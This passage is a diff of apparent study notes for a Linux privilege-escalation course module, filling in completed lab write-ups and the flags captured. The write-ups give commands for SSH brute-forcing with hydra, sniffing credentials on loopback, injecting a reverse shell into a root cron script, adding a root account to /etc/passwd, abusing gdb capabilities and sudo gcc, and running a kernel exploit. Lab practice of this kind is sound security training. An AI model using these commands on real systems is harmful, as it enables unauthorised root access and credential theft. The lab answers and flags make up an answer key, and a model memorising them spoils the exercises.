@@ -267,7 +267,12 @@ sudo -l
 **Quiz answer (18.2.1):**
 - Command to list sudoer capabilities for a given user: **`sudo -l`**
 
-> 🚩 Hands-on, VM spin-up required: 18.2.1 VM#2. Connect with provided credentials, hunt through dotfiles and env vars for a credential, use it to access another user's files and retrieve the flag. ⬜ Pending
+**18.2.1 VM#2 -- COMPLETE**
+- As joe: `env` revealed `SCRIPT_CREDENTIALS=lab` → pattern Lab+digits → `crunch 6 6 -t Lab%%% > wordlist.txt`
+- `hydra -l eve -P wordlist.txt 192.168.236.214 -t 4 ssh -V` → `eve:Lab123` found at attempt 124
+- SSH as eve → `sudo -l` → `(ALL : ALL) ALL` → `sudo -i` → root
+- Flag in `/home/eve/.bashrc` as `export PASSWORD=OS{cc74dc4e61542e49c29c4ee8ae29bf22}`
+- Key lesson: credential hunting requires chaining -- joe's env var gave the pattern, crunch + hydra cracked eve's password, eve's dotfile held the flag
 
 #### Tags: #Dotfiles #CredentialHunting #hydra #crunch #sudo #Module18
 
@@ -302,7 +307,12 @@ sudo tcpdump -i lo -A | grep "pass"
 **Quiz answer (18.2.2):**
 - Utility used to constantly inspect ps output: **`watch`**
 
-> 🚩 Hands-on, VM spin-up required: 18.2.2 VM#1. Connect as joe, use `watch -n 1 "ps -aux | grep pass"` to capture a cleartext credential from a root-owned process, use it to escalate and retrieve the flag. ⬜ Pending
+**18.2.2 VM#1 -- COMPLETE**
+- `watch -n 1 "ps -aux | grep pass"` showed no sshpass process on this VM -- credential was transmitted over loopback as network traffic instead
+- `sudo -l` confirmed joe can run tcpdump
+- `sudo tcpdump -i lo -A | grep "pass"` captured two credentials cycling on loopback: `user:root,pass:lab` and `user:flag,pass:OS{3ca97f75b16e0d92801f8fbebb395733}`
+- Flag: `OS{3ca97f75b16e0d92801f8fbebb395733}`
+- Key lesson: this section covers TWO techniques -- process watching AND tcpdump. Real VMs may only be vulnerable to one. Try both before giving up.
 
 #### Tags: #ProcessHunting #watch #tcpdump #CredentialSniffing #Module18
 
@@ -359,9 +369,19 @@ whoami
 **Quiz answer (18.3.1):**
 - Log file holding cron job activity: **/var/log/syslog**
 
-> 🚩 Hands-on, VM spin-up required: 18.3.1 VM#1. Connect as joe, confirm via syslog that user_backups.sh runs every minute as root, inject reverse shell one-liner, catch root shell on nc listener, read the flag. ⬜ Pending
+**18.3.1 VM#1 -- COMPLETE**
+- `grep "CRON" /var/log/syslog` revealed `/home/joe/.scripts/user_backups.sh` running as root every minute
+- `ls -lah` showed `-rwxrwxrw-` permissions
+- Injected `mkfifo /tmp/g` reverse shell via `echo >>` (had to use /tmp/g -- cron had already run the /tmp/f payload as root, making /tmp/f root-owned and undeletable by joe)
+- nc listener on 1234, shell landed as uid=0(root)
+- Quiz answer: `/var/log/syslog` (no OS{} flag on VM#1 -- task was just to demonstrate root shell)
 
-> 🚩 Hands-on, VM spin-up required: 18.3.1 VM#2. Find a different misconfigured root-owned cron job, exploit it for a root shell, retrieve the flag. ⬜ Pending
+**18.3.1 VM#2 -- COMPLETE**
+- Two cron jobs found: `user_backups.sh` and `/tmp/this_is_fine.sh`
+- `/tmp/this_is_fine.sh` was `-rwxrwxrw-` and nearly empty (just shebang) -- overwrote it cleanly with `echo '#!/bin/bash' > /tmp/this_is_fine.sh && echo "mkfifo shell" >> ...`
+- Shell landed as uid=0(root)
+- Flag in `/root/flag.txt`: `OS{9e0df5dce22d6a78ecfde18e80626eee}`
+- Key lesson: scripts dropped in /tmp and forgotten are a classic real-world find; /tmp is always world-writable
 
 #### Tags: #CronJob #ScheduledTasks #ReverseShell #InsecureFilePermissions #Module18
 
@@ -403,9 +423,15 @@ id
 **Quiz answer (18.3.2):**
 - Hashing algorithm used by default with `openssl passwd`: **crypt** (DES-based Unix crypt algorithm)
 
-> 🚩 Hands-on, VM spin-up required: 18.3.2 VM#1. Confirm /etc/passwd is world-writable, generate a hash with openssl, inject the root2 line, su to root2, retrieve the flag. ⬜ Pending
+**18.3.2 VM#1 -- COMPLETE**
+- `/etc/passwd` confirmed `-rw-rw-rw-`
+- `openssl passwd w00t` → `5UGFukvbctTC6`
+- Injected `root2:5UGFukvbctTC6:0:0:root:/root:/bin/bash` → `su root2` → uid=0(root)
+- Quiz answer: `crypt` (no OS{} flag on VM#1 -- task was to demonstrate technique)
 
-> 🚩 Hands-on, VM spin-up required: 18.3.2 VM#2. Same technique, different machine, retrieve the flag. ⬜ Pending
+**18.3.2 VM#2 -- COMPLETE**
+- Same technique: openssl passwd w00t → `IeFDZFw8Ilh3M` → injected root2 → su root2 → uid=0(root)
+- Flag in `/root/flag.txt`: `OS{581fdef8acf64f495d004643effd2a77}`
 
 #### Tags: #PasswordAuthentication #etcpasswd #openssl #Module18
 
@@ -503,9 +529,15 @@ uid=0(root) gid=1000(joe) groups=...
 **Quiz answers (18.4.1):**
 - Utility to manually search for misconfigured capabilities: **`getcap`** (full path: `/usr/sbin/getcap`)
 
-> 🚩 Hands-on, VM spin-up required: 18.4.1 VM#1. Enumerate SUID binaries, find a non-standard one, exploit it via GTFOBins (find -exec bash -p or equivalent), get root shell. ⬜ Pending
+**18.4.1 VM#1 -- COMPLETE**
+- Quiz answer: `getcap` (command name only, not full path)
+- Task: demonstrate root shell via SUID binary abuse (no OS{} flag on VM#1)
 
-> 🚩 Hands-on, VM spin-up required: 18.4.1 VM#2. Enumerate capabilities with `getcap -r / 2>/dev/null`, find a binary with cap_setuid+ep, exploit it via GTFOBins, retrieve the flag. ⬜ Pending
+**18.4.1 VM#2 -- COMPLETE**
+- `getcap -r / 2>/dev/null` found `/usr/bin/gdb = cap_setuid+ep`
+- Exploit (GTFOBins): `gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit`
+- Shell spawned with uid=0(root) gid=1000(joe) -- UID changed, GID stays joe (capability only changes UID)
+- Flag in `/root/flag.txt`: `OS{4c2b0905e576c6e46289187d9a63904c}`
 
 #### Tags: #SUID #eUID #Capabilities #getcap #GTFOBins #Module18
 
@@ -560,9 +592,15 @@ sudo apt-get changelog apt
 **Quiz answers (18.4.2):**
 - Kernel module enforcing MAC policies: **AppArmor** (Mandatory Access Control; SELinux serves the same role on RHEL/CentOS)
 
-> 🚩 Hands-on, VM spin-up required: 18.4.2 VM#1. Connect as joe, run `sudo -l`, identify the exploitable sudo entry, use GTFOBins to drop a root shell. ⬜ Pending
+**18.4.2 VM#1 -- COMPLETE**
+- Quiz answer: `AppArmor` (no OS{} flag on VM#1)
 
-> 🚩 Hands-on, VM spin-up required: 18.4.2 VM#2. Find and exploit a different sudo misconfiguration to get root. ⬜ Pending
+**18.4.2 VM#2 -- COMPLETE**
+- `sudo -l` revealed: `/usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/gcc`
+- Different from module example (apt-get) -- this VM has gcc
+- GTFOBins sudo/gcc: `sudo gcc -wrapper /bin/sh,-s .` → uid=0(root)
+- Flag in `/root/flag.txt`: `OS{0b6427c20ed7cead6c83a8d61625571c}`
+- Key lesson: always check GTFOBins for the actual binary on the target -- the lab will vary from module examples
 
 #### Tags: #sudo #AppArmor #GTFOBins #SudoAbuse #Module18
 
@@ -623,7 +661,12 @@ uid=0(root) gid=0(root) groups=0(root),1001(joe)
 **Quiz answer (18.4.3):**
 - Compiler used to build the exploit binary: **gcc**
 
-> 🚩 Hands-on, VM spin-up required: 18.4.3 VM#1. Gather kernel info with `uname -r` and `arch`, run searchsploit to find a matching exploit, transfer and compile on target, run exploit, confirm root shell. ⬜ Pending
+**18.4.3 VM#1 -- COMPLETE**
+- Ubuntu 16.04.4, kernel 4.4.0-116-generic, x86_64
+- `searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"` → `45010.c` (CVE-2017-16995)
+- Renamed to `cve-2017-16995.c`, scp'd to target, compiled with gcc, ran exploit
+- Output: `[*] credentials patched, launching shell...` → uid=0(root)
+- Quiz answer: `gcc` (no OS{} flag on VM#1)
 
 > 🚩 Hands-on, VM spin-up required: 18.4.3 VM#2 (Capstone). Get root by abusing a different vulnerability from those covered in the module. ⬜ Pending
 
@@ -707,12 +750,12 @@ flowchart TD
 - [x] **18.1.1 Understanding Files and User Privileges on Linux:** done (rwx model, owner/group/others table, file vs directory permission differences, /etc/shadow example, permission diagram)
 - [x] **18.1.2 Manual Enumeration:** done (12-step checklist with expected output for each command; SUID, cron, network, kernel module enumeration; quiz answers: codename=buster, crontab flag=-l, SUID for the mechanism Q; VM#1 flag OS{b6eb1b203002b9d722537f581d42567c} via strings on /usr/bin/passwd_flag)
 - [x] **18.1.3 Automated Enumeration:** done (unix-privesc-check standard mode, LinPEAS, LinEnum usage and tips; VM#1 flag OS{3bc7a751241f4e88f5f18f7d2e67fcb2} -- world-writable /etc/sudoers)
-- [x] **18.2.1 Inspecting User Trails:** done (dotfiles, env vars, .bashrc credential export pattern, crunch targeted wordlist, hydra SSH brute force, sudo -l; quiz: sudo -l)
-- [x] **18.2.2 Inspecting Service Footprints:** done (watch -n 1 ps aux grep pass, tcpdump loopback, AppArmor note; quiz: watch)
-- [x] **18.3.1 Abusing Cron Jobs:** done (syslog CRON grep, script permission check, mkfifo reverse shell injection, nc listener; quiz: /var/log/syslog)
-- [x] **18.3.2 Abusing Password Authentication:** done (/etc/passwd world-writable exploitation, openssl passwd crypt algorithm, root user injection format, su confirmation; quiz: crypt)
-- [x] **18.4.1 Abusing Setuid Binaries and Capabilities:** done (real UID vs eUID concept, SUID bit, /proc/PID/status verification, find -exec bash -p, getcap -r, cap_setuid+ep, perl GTFOBins; quiz: getcap)
-- [x] **18.4.2 Abusing Sudo:** done (sudo -l, AppArmor interference and detection, aa-status, apt-get changelog GTFOBins; quiz: AppArmor)
+- [x] **18.2.1 Inspecting User Trails:** done (dotfiles, env vars, .bashrc credential export pattern, crunch targeted wordlist, hydra SSH brute force, sudo -l; quiz: sudo -l; VM#2 flag OS{cc74dc4e61542e49c29c4ee8ae29bf22} -- eve:Lab123 via crunch+hydra, flag in eve's .bashrc as export PASSWORD=)
+- [x] **18.2.2 Inspecting Service Footprints:** done (watch -n 1 ps aux grep pass, tcpdump loopback, AppArmor note; quiz: watch; VM#1 flag OS{3ca97f75b16e0d92801f8fbebb395733} -- tcpdump on lo captured user:flag,pass:OS{...} cycling on loopback; watch showed nothing on this VM)
+- [x] **18.3.1 Abusing Cron Jobs:** done (syslog CRON grep, script permission check, mkfifo reverse shell injection, nc listener; quiz: /var/log/syslog; VM#2 flag OS{9e0df5dce22d6a78ecfde18e80626eee} -- /tmp/this_is_fine.sh world-writable, overwrote with reverse shell)
+- [x] **18.3.2 Abusing Password Authentication:** done (/etc/passwd world-writable exploitation, openssl passwd crypt algorithm, root user injection format, su confirmation; quiz: crypt; VM#2 flag OS{581fdef8acf64f495d004643effd2a77})
+- [x] **18.4.1 Abusing Setuid Binaries and Capabilities:** done (real UID vs eUID concept, SUID bit, /proc/PID/status verification, find -exec bash -p, getcap -r, cap_setuid+ep, perl GTFOBins; quiz: getcap; VM#2 flag OS{4c2b0905e576c6e46289187d9a63904c} -- gdb cap_setuid+ep, gdb python os.setuid(0) then !sh)
+- [x] **18.4.2 Abusing Sudo:** done (sudo -l, AppArmor interference and detection, aa-status, apt-get changelog GTFOBins; quiz: AppArmor; VM#2 flag OS{0b6427c20ed7cead6c83a8d61625571c} -- sudo gcc -wrapper /bin/sh,-s .)
 - [x] **18.4.3 Exploiting Kernel Vulnerabilities:** done (uname -r + arch enumeration, searchsploit filtering, inspect source, compile on target, CVE-2017-16995; quiz: gcc)
 - [x] **18.5 Wrapping Up:** done (decision flowchart, external resources, related boxes)
 
